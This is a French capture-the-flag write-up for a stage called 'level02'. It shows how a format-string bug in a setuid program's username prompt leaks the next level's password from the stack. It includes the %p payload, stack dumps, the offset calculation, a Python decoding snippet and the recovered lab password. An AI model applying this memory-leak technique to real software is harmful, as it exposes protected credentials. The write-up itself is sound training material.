level02:

Encore un programme qui demande un username et un password, mais cette fois il y a un appel a /bin/sh. Il est juste derrière un strcmp, où la string comparée est le contenu du .pass du level03. On peut peut-être la récupérer avec gdb. Mais en lançant le programme dans gdb on obtient
(gdb) r
Starting program: /home/users/level02/level02
ERROR: failed to open password file

Effectivement il faut avoir le euid root pour fread le password, donc on ne pourra pas voir la solution dans gdb.

En revanche on remarque que le printf qui print le username est vulnérable aux format strings. On va essayer de print le mot de passe tel quel.
Si on prend notre reproduction du code source générée à partir de Ghidra, qu'on le compile localement et qu'on remplace le .pass imprimé par un fichier local rempli de 40 A, on devrait pouvoir voir à partir de quelle adresse les A apparaissent.

On édite level02.c pour remplacer `/home/users/level03/.pass` par `cool.txt` puis
```
gcc -z execstack -fno-stack-protector -m64 level02.c -o level02test
python -c "print('A'* 40)" > cool.txt
python -c "print('%p '* 60)" et on copie l'output

./level02test
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: *****************************************
0x7ffd32ba09f0 0x25 0xffffffff 0x7f273e51fa70 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 (nil) 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520  does not have access!

```
Les A apparaissent de %20$p a %24$p. Pas surprenant dans la mesure où le buffer fait 40 char (donc 8 * 5 comme on est en x64 cette fois contrairement aux autres binaires)

Si on répète l'opération avec le vrai binaire on obtient

```
0x7fffffffe4f0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

L'emplacement 20 correspond a 0x100000000, 21 a (nil) ça n'a pas l'air bon. Avant c'est toujours les mêmes caractères mais après ça varie beaucoup donc on peut assumer qu'il est décalé de 2, donc le mdp se situe de %22$p à %26$p (assignations mémoires pas exactement pareilles peut-être)

on lance level02 une derniere fois avec comme username `["%22$p","%23$p","%24$p","%25$p","%26$p"]` pour avoir un début de formattage

On prend l'array, on décode chaque bloc (en enlevant les 2 premiers caractères), puis on les inverse (comme ça a été encodé en little endian) :
```
ok = ["0x756e505234376848","0x45414a3561733951","0x377a7143574e6758","0x354a35686e475873","0x48336750664b394d"]
for s in ok:
    print(bytearray.fromhex(s[2:]).decode()[::-1], end="")
```

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H